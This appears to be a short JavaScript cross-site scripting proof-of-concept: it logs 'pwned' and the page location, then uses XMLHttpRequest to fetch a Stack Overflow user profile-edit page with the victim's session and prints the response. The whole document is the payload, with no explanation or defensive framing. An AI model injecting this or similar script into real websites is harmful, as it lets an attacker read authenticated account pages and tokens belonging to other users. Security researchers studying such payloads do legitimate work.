console.log("pwned");
console.log(location)
function reqListener () {
	  console.log(this.responseText);
}

var oReq = new XMLHttpRequest();
oReq.addEventListener("load", reqListener);
oReq.open("GET", "https://stackoverflow.com/users/edit/14781778");
oReq.send();
